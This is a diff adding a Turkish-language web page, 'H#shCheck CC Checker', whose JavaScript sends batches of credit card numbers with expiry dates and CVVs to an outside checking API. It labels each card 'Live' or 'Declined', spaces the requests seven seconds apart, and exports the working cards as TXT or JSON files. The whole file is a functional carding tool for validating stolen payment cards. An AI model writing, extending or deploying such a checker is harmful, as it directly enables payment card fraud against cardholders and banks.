@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>H#shCheck - CC Checker</title>
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0f0f0f, #2a1a5e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #e0e0e0;
+        }
+
+        .container {
+            max-width: 900px;
+            width: 100%;
+            background: #2a1a5e;
+            border-radius: 15px;
+            border: 2px solid #7b4eff;
+            box-shadow: 0 8px 24px rgba(123, 78, 255, 0.3);
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 700;
+            text-align: center;
+            color: #ffd700;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+            margin-bottom: 10px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .input-text {
+            flex: 2;
+            min-width: 300px;
+            position: relative;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            font-size: 16px;
+            background: #1c1c1c;
+            border: 2px solid #7b4eff;
+            border-radius: 10px;
+            color: #e0e0e0;
+            outline: none;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            border-color: #ffd700;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+        }
+
+        input::placeholder {
+            color: #888;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 22px;
+            height: 22px;
+            fill: #7b4eff;
+        }
+
+        .file-input-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            min-width: 200px;
+            position: relative;
+        }
+
+        input[type="file"] {
+            display: none;
+        }
+
+        .file-input-label {
+            padding: 15px;
+            font-size: 16px;
+            background: #7b4eff;
+            color: #ffffff;
+            border-radius: 10px;
+            cursor: pointer;
+            text-align: center;
+            transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .file-input-label:hover {
+            background: #5a3acc;
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+        }
+
+        .file-name {
+            font-size: 14px;
+            color: #e0e0e0;
+            max-width: 150px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 10px;
+            min-width: 150px;
+        }
+
+        button {
+            padding: 15px;
+            font-size: 16px;
+            background: #7b4eff;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        button:hover {
+            background: #5a3acc;
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+        }
+
+        #stopButton {
+            background: #ff4d4d;
+        }
+
+        #stopButton:hover {
+            background: #cc3333;
+            box-shadow: 0 0 15px rgba(255, 77, 77, 0.5);
+        }
+
+        .download-buttons {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        .download-buttons button {
+            background: #1c1c1c;
+            border: 2px solid #7b4eff;
+            font-size: 14px;
+            gap: 8px;
+        }
+
+        .download-buttons button:hover {
+            background: #5a3acc;
+            border-color: #ffd700;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+        }
+
+        #response {
+            background: #1c1c1c;
+            border-radius: 10px;
+            padding: 20px;
+            font-family: 'JetBrains+Mono', monospace;
+            font-size: 14px;
+            line-height: 1.6;
+            color: #e0e0e0;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            border: 2px solid #7b4eff;
+            box-shadow: 0 4px 12px rgba(123, 78, 255, 0.2);
+            position: relative;
+        }
+
+        #response.loading::before {
+            content: '';
+            display: block;
+            width: 40px;
+            height: 40px;
+            border: 5px solid #7b4eff;
+            border-top: 5px solid #ffd700;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .live {
+            color: #00cc00;
+            font-weight: bold;
+        }
+
+        .declined {
+            color: #ff4d4d;
+            font-weight: bold;
+        }
+
+        .unknown {
+            color: #ffa500;
+            font-weight: bold;
+        }
+
+        .error {
+            color: #ff4d4d;
+            font-weight: bold;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
+        }
+
+        .notification {
+            color: #ffd700;
+            font-weight: bold;
+        }
+
+        #stopButton {
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            .input-group {
+                flex-direction: column;
+            }
+
+            .input-text, .file-input-wrapper, .button-group {
+                min-width: 100%;
+            }
+
+            .file-name {
+                max-width: 100%;
+            }
+
+            .download-buttons {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+
+            h1 {
+                font-size: 26px;
+            }
+
+            input[type="text"], .file-input-label, button {
+                font-size: 14px;
+                padding: 12px;
+            }
+
+            .input-icon {
+                width: 18px;
+                height: 18px;
+            }
+
+            #response {
+                font-size: 13px;
+                max-height: 300px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Kart Sorgulama</h1>
+        <div class="input-group">
+            <div class="input-text">
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="2" y="4" width="20" height="16" rx="2"/>
+                    <path d="M7 15h10"/>
+                </svg>
+                <input type="text" id="dataInput" placeholder="Tek kart gir (ör. 4268880484010008|12|2025|557)">
+            </div>
+            <div class="file-input-wrapper">
+                <input type="file" id="fileInput" accept=".txt">
+                <label for="fileInput" class="file-input-label">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                        <polyline points="17 8 12 3 7 8"/>
+                        <line x1="12" y1="3" x2="12" y2="15"/>
+                    </svg>
+                    Dosya Seç
+                </label>
+                <span class="file-name" id="fileName">Dosya seçilmedi</span>
+            </div>
+            <div class="button-group">
+                <button id="startButton" onclick="processCards()">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
+                    </svg>
+                    Sorgula
+                </button>
+                <button id="stopButton" onclick="stopProcessing()">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="3" y="3" width="18" height="18" rx="2"/>
+                    </svg>
+                    Dur
+                </button>
+            </div>
+        </div>
+        <div id="response">Yanıt burada görünecek</div>
+        <div class="download-buttons">
+            <button onclick="downloadLive('txt')">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                    <polyline points="7 10 12 15 17 10"/>
+                    <line x1="12" y1="15" x2="12" y2="3"/>
+                </svg>
+                Live Kartlar (TXT)
+            </button>
+            <button onclick="downloadLive('json')">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                    <polyline points="7 10 12 15 17 10"/>
+                    <line x1="12" y1="15" x2="12" y2="3"/>
+                </svg>
+                Live Kartlar (JSON)
+            </button>
+            <button onclick="downloadAll('txt')">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                    <polyline points="7 10 12 15 17 10"/>
+                    <line x1="12" y1="15" x2="12" y2="3"/>
+                </svg>
+                Tüm Sonuçlar (TXT)
+            </button>
+            <button onclick="downloadAll('json')">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                    <polyline points="7 10 12 15 17 10"/>
+                    <line x1="12" y1="15" x2="12" y2="3"/>
+                </svg>
+                Tüm Sonuçlar (JSON)
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Ülke koduna göre bayrak eşleştirme tablosu
+        const flagMap = {
+            TR: '🇹🇷',
+            US: '🇺🇸',
+            GB: '🇬🇧',
+            CA: '🇨🇦',
+            AU: '🇦🇺',
+            DE: '🇩🇪',
+            FR: '🇫🇷',
+            IT: '🇮🇹',
+            ES: '🇪🇸',
+            JP: '🇯🇵'
+        };
+
+        let results = [];
+        let isProcessing = false;
+        let stopRequested = false;
+
+        // Dosya adı gösterme
+        document.getElementById('fileInput').addEventListener('change', function() {
+            const fileName = this.files[0]?.name || 'Dosya seçilmedi';
+            document.getElementById('fileName').textContent = fileName;
+        });
+
+        // Kart formatını API için düzenle
+        function normalizeCardFormat(card) {
+            let cleanCard = card.trim().replace(/\s+|\|/g, '|');
+            let parts = cleanCard.split('|').filter(p => p);
+            if (parts.length < 4) return null;
+
+            let [num, mm, yy, cvv] = parts;
+            num = num.replace(/\D/g, '');
+            mm = mm.padStart(2, '0');
+            yy = yy.length === 2 ? `20${yy}` : yy;
+            cvv = cvv.replace(/\D/g, '');
+
+            if (num.length < 16 || mm.length !== 2 || yy.length !== 4 || cvv.length < 3) return null;
+            return `${num}|${mm}|${yy}|${cvv}`;
+        }
+
+        async function sendRequest(cardData, retryCount = 0) {
+            const responseDiv = document.getElementById('response');
+            const url = "https://api.chkr.cc";
+            const payload = { data: cardData };
+            const maxRetries = 1;
+
+            const startTime = performance.now();
+
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    },
+                    body: `data=${encodeURIComponent(payload.data)}`
+                });
+
+                const endTime = performance.now();
+                const checkDuration = Math.round(endTime - startTime);
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`HTTP hatası! Durum: ${response.status}, Mesaj: ${errorText}`);
+                }
+
+                const data = await response.json();
+                console.log("API Yanıtı:", data);
+
+                const message = typeof data.message === 'string' ? data.message.toLowerCase() : "";
+                if (message.includes("proxy error") && retryCount < maxRetries) {
+                    console.log(`Proxy hatası alındı, tekrar deneniyor (${retryCount + 1}/${maxRetries})`);
+                    return sendRequest(cardData, retryCount + 1);
+                }
+
+                return { data, checkDuration };
+            } catch (error) {
+                return { error: error.message, checkDuration: Math.round(performance.now() - startTime) };
+            }
+        }
+
+        function summarizeResults() {
+            const liveCount = results.filter(r => r.message && (r.message.toLowerCase().includes("charge ok") || r.message.toLowerCase().includes("live"))).length;
+            const declinedCount = results.filter(r => r.message && r.message.toLowerCase().includes("declined")).length;
+            const unknownCount = results.filter(r => r.message && !(r.message.toLowerCase().includes("charge ok") || r.message.toLowerCase().includes("live") || r.message.toLowerCase().includes("declined"))).length;
+            return `Sorgulama durduruldu!\nSonuçlar: ${liveCount} adet Live, ${declinedCount} adet Declined, ${unknownCount} adet Bilinmeyen\n━━━━━━━━━━━━━━━`;
+        }
+
+        async function processCards() {
+            const dataInput = document.getElementById('dataInput').value;
+            const fileInput = document.getElementById('fileInput').files[0];
+            const responseDiv = document.getElementById('response');
+            const startButton = document.getElementById('startButton');
+            const stopButton = document.getElementById('stopButton');
+
+            results = [];
+            isProcessing = true;
+            stopRequested = false;
+            startButton.style.display = 'none';
+            stopButton.style.display = 'block';
+
+            responseDiv.classList.add('loading');
+            responseDiv.textContent = "";
+
+            let cards = [];
+
+            if (dataInput) {
+                const normalized = normalizeCardFormat(dataInput);
+                if (normalized) cards.push(normalized);
+            }
+
+            if (fileInput) {
+                const text = await fileInput.text();
+                const lines = text.split('\n').map(line => line.trim()).filter(line => line);
+                cards = [...cards, ...lines.map(normalizeCardFormat).filter(c => c)];
+            }
+
+            if (cards.length === 0) {
+                responseDiv.classList.remove('loading');
+                responseDiv.textContent = "Hata: Geçerli kart bulunamadı.";
+                responseDiv.classList.add('error');
+                isProcessing = false;
+                startButton.style.display = 'block';
+                stopButton.style.display = 'none';
+                return;
+            }
+
+            for (let i = 0; i < cards.length; i++) {
+                if (stopRequested) {
+                    responseDiv.textContent += summarizeResults();
+                    break;
+                }
+
+                const card = cards[i];
+                responseDiv.textContent += `\nKart ${i + 1}/${cards.length} sorgulanıyor...\n`;
+
+                const result = await sendRequest(card);
+                const display = formatResponse(result.data, result.checkDuration, card);
+                results.push({ card, ...result.data, checkDuration: result.checkDuration });
+
+                responseDiv.textContent += display + '\n━━━━━━━━━━━━━━━\n';
+
+                if (i < cards.length - 1 && !stopRequested) {
+                    responseDiv.textContent += `7 saniye bekleniyor...\n`;
+                    await new Promise(resolve => setTimeout(resolve, 7000));
+                }
+            }
+
+            responseDiv.classList.remove('loading');
+            isProcessing = false;
+            startButton.style.display = 'block';
+            stopButton.style.display = 'none';
+        }
+
+        function stopProcessing() {
+            stopRequested = true;
+        }
+
+        function formatResponse(data, checkDuration, card) {
+            if (!data || typeof data !== 'object') {
+                return `Hata: Geçersiz yanıt yapısı\nKart: ${card}`;
+            }
+
+            const message = typeof data.message === 'string' ? data.message : "Bilinmeyen mesaj";
+            const filteredMessage = message
+                .replace(/\s*\([^)]+\)/g, '')
+                .replace(/\s*\[[^\]]+\]/g, '')
+                .trim();
+
+            let status, statusClass;
+            if (filteredMessage.toLowerCase().includes("charge ok") || filteredMessage.toLowerCase().includes("live")) {
+                status = "✔️ Live/Geçerli";
+                statusClass = "live";
+            } else if (filteredMessage.toLowerCase().includes("declined")) {
+                status = "❌ Declined/Geçersiz";
+                statusClass = "declined";
+            } else {
+                status = "⚠ Bilinmeyen durum";
+                statusClass = "unknown";
+            }
+
+            const cardObj = data.card || {};
+            const country = cardObj.country || {};
+            const countryEmoji = country.emoji || flagMap[country.code] || '🏳️';
+
+            const cardDetails = {
+                card: cardObj.card || card,
+                bank: cardObj.bank || "Bilinmeyen banka",
+                brand: cardObj.brand || "Bilinmeyen marka",
+                category: cardObj.category || "Bilinmeyen kategori",
+                country: {
+                    name: country.name || "Bilinmeyen ülke",
+                    code: country.code || "XX",
+                    emoji: countryEmoji
+                }
+            };
+
+            return `H#shCheck CC Checker
+━━━━━━━━━━━━━━━
+💳 Kart: ${cardDetails.card}
+━━━━━━━━━━━━━━━
+🏦 BIN Bilgisi
+• Banka: ${cardDetails.bank}
+• Seviye: ${cardDetails.brand}
+• Tip: ${cardDetails.category}
+• Ülke: ${cardDetails.country.name} (${cardDetails.country.code}${cardDetails.country.emoji})
+━━━━━━━━━━━━━━━
+📊 Sonuç
+• Durum: ${status} 😈
+• Mesaj: ${filteredMessage}
+━━━━━━━━━━━━━━━
+⏱️ Check Süresi: ${checkDuration}ms`;
+        }
+
+        function downloadLive(format) {
+            const liveResults = results.filter(r => r.message && (r.message.toLowerCase().includes("charge ok") || r.message.toLowerCase().includes("live")));
+            const responseDiv = document.getElementById('response');
+
+            if (liveResults.length === 0) {
+                responseDiv.textContent += '\n<span class="error">Hata: Live kart bulunamadı!</span>\n';
+                return;
+            }
+
+            let content, filename;
+            if (format === 'txt') {
+                content = liveResults.map(r => r.card.card || r.card).join('\n');
+                filename = 'H#shCheck_Live_Cards.txt';
+            } else {
+                content = JSON.stringify(liveResults, null, 2);
+                filename = 'H#shCheck_Live_Cards.json';
+            }
+
+            const blob = new Blob([content], { type: format === 'txt' ? 'text/plain' : 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            a.click();
+            URL.revokeObjectURL(url);
+
+            responseDiv.textContent += `\n<span class="notification">${filename} indirildi!</span>\n`;
+        }
+
+        function downloadAll(format) {
+            const responseDiv = document.getElementById('response');
+
+            if (results.length === 0) {
+                responseDiv.textContent += '\n<span class="error">Hata: Sonuç bulunamadı!</span>\n';
+                return;
+            }
+
+            let content, filename;
+            if (format === 'txt') {
+                content = results.map(r => `${r.card.card || r.card} - ${r.message || 'Hata'}`).join('\n');
+                filename = 'H#shCheck_ALL_Cards.txt';
+            } else {
+                content = JSON.stringify(results, null, 2);
+                filename = 'H#shCheck_ALL_Cards.json';
+            }
+
+            const blob = new Blob([content], { type: format === 'txt' ? 'text/plain' : 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            a.click();
+            URL.revokeObjectURL(url);
+
+            responseDiv.textContent += `\n<span class="notification">${filename} indirildi!</span>\n`;
+        }
+    </script>
+</body>
+</html>
